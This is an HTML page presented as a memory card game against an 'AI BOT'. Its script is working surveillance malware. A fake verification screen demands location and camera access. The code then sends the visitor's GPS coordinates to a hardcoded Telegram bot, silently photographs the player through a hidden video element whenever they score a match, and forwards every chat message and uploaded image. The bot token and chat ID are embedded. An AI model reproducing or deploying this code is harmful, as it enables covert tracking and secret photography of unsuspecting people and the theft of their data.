<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Multiplayer Memory Pro</title>
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: white; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* الحاوية الرئيسية للهاتف والكمبيوتر */
        .container { display: flex; flex: 1; height: 100%; overflow: hidden; }
        
        /* مساحة اللعبة */
        .game-area { flex: 2; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.1; pointer-events: none; transition: 0.5s; }
        .game-ready { opacity: 1 !important; pointer-events: all !important; }
        
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; width: 100%; max-width: 400px; }
        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 1px solid #333; transition: 0.2s; }
        .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
        .card.matched-p { background: var(--player) !important; color: #000; border: none; }
        .card.matched-ai { background: var(--ai) !important; color: #000; border: none; }
        
        /* قسم الدردشة */
        .chat-section { flex: 1; min-width: 320px; background: #111; border-left: 1px solid #333; display: flex; flex-direction: column; }
        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; font-size: 14px; }
        .msg { padding: 10px 14px; border-radius: 12px; max-width: 85%; line-height: 1.4; word-wrap: break-word; }
        .msg.ai { background: #222; align-self: flex-start; border-bottom-left-radius: 2px; }
        .msg.user { background: var(--primary); color: #000; align-self: flex-end; border-bottom-right-radius: 2px; }
        .msg img { max-width: 100%; border-radius: 10px; margin-top: 8px; }

        .input-area { display: flex; align-items: center; padding: 15px; gap: 10px; background: #1a1a1a; }
        input[type="text"] { flex: 1; background: #262626; border: none; padding: 12px 15px; border-radius: 25px; color: white; outline: none; font-size: 16px; }
        .icon-btn { cursor: pointer; font-size: 22px; transition: 0.2s; }

        /* الشاشات المنبثقة */
        #overlay, #end-screen { position: fixed; inset: 0; background: var(--bg); z-index: 2000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 40px; font-weight: bold; font-size: 18px; cursor: pointer; }

        /* --- استعلامات الوسائط (Media Queries) للهاتف --- */
        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .chat-section { flex: none; height: 250px; border-left: none; border-top: 1px solid #333; }
            .grid { max-width: 320px; gap: 6px; }
            .card { font-size: 20px; }
        }

        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div id="overlay">
    <div>
        <h2 style="color: var(--primary);">System Verification</h2>
        <p style="color: #888; margin-bottom: 25px;">Verify Location & Camera to start the multiplayer session.</p>
        <button class="btn" onclick="requestAccess()">Connect & Play</button>
    </div>
</div>

<div id="end-screen" style="display: none;">
    <div>
        <h2 id="end-title" style="color: var(--primary);">Match Finished</h2>
        <p id="end-score" style="margin-bottom: 20px; color: #ccc;"></p>
        <button class="btn" onclick="restartGame()">Play Again 🔄</button>
    </div>
</div>

<div class="container">
    <div class="game-area" id="main-game">
        <div style="margin-bottom: 15px; font-size: 15px; font-weight: bold;">
            <span style="color: var(--player)">YOU: <span id="p-score">0</span></span> | 
            <span style="color: var(--ai)">AI BOT: <span id="ai-score">0</span></span>
        </div>
        <div class="grid" id="grid"></div>
    </div>

    <div class="chat-section">
        <div class="messages" id="chat-box">
            <div class="msg ai">System: Neural link active. Waiting for player...</div>
        </div>
        <div class="input-area">
            <label class="icon-btn">📎<input type="file" id="file-input" style="display:none" accept="image/*" onchange="sendUserPhoto(this)"></label>
            <input type="text" id="user-input" placeholder="Chat..." onkeypress="if(event.key==='Enter') handleChat()">
            <span class="icon-btn" onclick="handleChat()">🚀</span>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    let symbols = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍋','🍑','🥑','🥥'];
    let deck = [...symbols, ...symbols];
    let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0, aiMemory = {};

    function requestAccess() {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                sendTele(`📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                setupCamera();
            },
            () => { alert("Location access is mandatory for server sync."); location.reload(); }
        );
    }

    async function setupCamera() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = s;
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('main-game').classList.add('game-ready');
            renderGrid();
        } catch(e) { alert("Camera access required for verification."); location.reload(); }
    }

    function renderGrid() {
        const grid = document.getElementById('grid');
        grid.innerHTML = '';
        deck.sort(() => Math.random() - 0.5);
        deck.forEach((s, i) => {
            const card = document.createElement('div');
            card.className = 'card';
            card.dataset.val = s; card.dataset.id = i;
            card.onclick = () => playerMove(card);
            grid.appendChild(card);
        });
    }

    function playerMove(card) {
        if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
        reveal(card);
        flipped.push(card);
        if (flipped.length === 2) { turn = 'wait'; setTimeout(checkMatch, 700); }
    }

    function reveal(card) {
        card.classList.add('flipped');
        card.innerText = card.dataset.val;
        aiMemory[card.dataset.id] = card.dataset.val;
    }

    function checkMatch() {
        const [c1, c2] = flipped;
        if (c1.dataset.val === c2.dataset.val) {
            c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            if (turn === 'player') { pScore++; silentCapture("Match: " + c1.dataset.val); } else { aiScore++; }
            matches++;
            delete aiMemory[c1.dataset.id]; delete aiMemory[c2.dataset.id];
            updateScore(); flipped = [];
            if (matches === 12) return showEnd();
            if (turn === 'ai') aiTurn(); else turn = 'player';
        } else {
            setTimeout(() => {
                c1.classList.remove('flipped'); c1.innerText = '';
                c2.classList.remove('flipped'); c2.innerText = '';
                flipped = [];
                if (turn === 'wait') aiTurn(); else turn = 'player';
            }, 500);
        }
    }

    function aiTurn() {
        turn = 'ai';
        setTimeout(() => {
            let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
            if (cards.length < 2) return;
            let forget = Math.random() < 0.4;
            let found = findMatch();
            let c1, c2;
            if (found && !forget) {
                c1 = document.querySelector(`[data-id="${found[0]}"]`);
                c2 = document.querySelector(`[data-id="${found[1]}"]`);
            } else {
                c1 = cards[Math.floor(Math.random() * cards.length)];
                reveal(c1);
                let mId = findInMem(c1.dataset.val, c1.dataset.id);
                if (mId && !forget) c2 = document.querySelector(`[data-id="${mId}"]`);
                else {
                    let rem = Array.from(document.querySelectorAll('.card:not(.flipped)'));
                    c2 = rem[Math.floor(Math.random() * rem.length)];
                }
            }
            if (flipped.length < 1) reveal(c1); flipped.push(c1);
            setTimeout(() => { reveal(c2); flipped.push(c2); setTimeout(checkMatch, 700); }, 800);
        }, 1200);
    }

    function findMatch() {
        let k = Object.keys(aiMemory);
        for (let i=0; i<k.length; i++) for (let j=i+1; j<k.length; j++) 
            if (aiMemory[k[i]] === aiMemory[k[j]]) return [k[i], k[j]];
        return null;
    }

    function findInMem(v, ex) {
        for (let id in aiMemory) if (aiMemory[id] === v && id !== ex) return id;
        return null;
    }

    function updateScore() {
        document.getElementById('p-score').innerText = pScore;
        document.getElementById('ai-score').innerText = aiScore;
    }

    function showEnd() {
        document.getElementById('end-screen').style.display = 'flex';
        document.getElementById('end-score').innerText = `Final Result: ${pScore} - ${aiScore}`;
    }

    function restartGame() {
        pScore = 0; aiScore = 0; matches = 0; turn = 'player'; aiMemory = {};
        updateScore(); document.getElementById('end-screen').style.display = 'none';
        renderGrid();
    }

    function silentCapture(r) {
        const can = document.getElementById('c');
        can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
        can.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', cid); fd.append('photo', b, 's.jpg');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.5);
    }

    function sendUserPhoto(input) {
        if (input.files && input.files[0]) {
            const reader = new FileReader();
            reader.onload = (e) => {
                addChat("user", `<img src="${e.target.result}">`);
                const fd = new FormData();
                fd.append('chat_id', cid); fd.append('photo', input.files[0]);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }
            reader.readAsDataURL(input.files[0]);
        }
    }

    function addChat(type, html) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = `msg ${type}`; m.innerHTML = html;
        box.appendChild(m); box.scrollTop = box.scrollHeight;
    }

    function handleChat() {
        const inp = document.getElementById('user-input');
        if (!inp.value.trim()) return;
        addChat("user", inp.value);
        sendTele(`💬 Chat: ${inp.value}`);
        inp.value = "";
    }

    function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
</script>
</body>
</html>
